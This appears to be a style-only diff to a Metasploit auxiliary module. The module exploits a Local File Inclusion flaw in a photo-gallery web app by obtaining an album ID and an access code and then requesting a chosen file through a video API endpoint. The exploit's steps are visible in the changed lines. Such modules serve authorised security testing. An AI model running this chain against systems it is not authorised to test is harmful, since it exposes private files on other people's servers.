@@ -56,7 +56,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def exploit_lfi(file_path, album_id, access_code, cookies)
-    print_status 'Attempting Local File Inclusion'
+    print_status('Attempting Local File Inclusion')
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'photo', 'p', 'api', 'video.php'),
       'method' => 'POST',
@@ -74,7 +74,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_access_code(album_id, cookies)
-    print_status 'Getting the Access Code'
+    print_status('Getting the Access Code')
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'photo', 'slideshow.php'),
       'vars_get' => { 'album' => album_id },
@@ -86,7 +86,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_album_id
-    print_status 'Getting the Album Id'
+    print_status('Getting the Album Id')
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'photo', 'p', 'api', 'album.php'),
       'method' => 'POST',
@@ -138,25 +138,25 @@ class MetasploitModule < Msf::Auxiliary
     album_id, cookies = get_album_id
 
     unless album_id
-      print_bad 'Failed to retrieve the Album Id'
+      print_bad('Failed to retrieve the Album Id')
       return
     end
 
-    print_good "Got Album Id : #{album_id}"
+    print_good("Got Album Id : #{album_id}")
 
     access_code = get_access_code(album_id, cookies)
 
     unless access_code
-      print_bad 'Failed to retrieve the Access Code'
+      print_bad('Failed to retrieve the Access Code')
       return
     end
 
-    print_good "Got Access Code : #{access_code}"
+    print_good("Got Access Code : #{access_code}")
 
-    file_content = exploit_lfi datastore['FILEPATH'], album_id, access_code, cookies
+    file_content = exploit_lfi(datastore['FILEPATH'], album_id, access_code, cookies)
 
     if file_content.nil? || file_content.empty?
-      print_bad 'Failed to perform Local File Inclusion'
+      print_bad('Failed to perform Local File Inclusion')
       return
   end
 
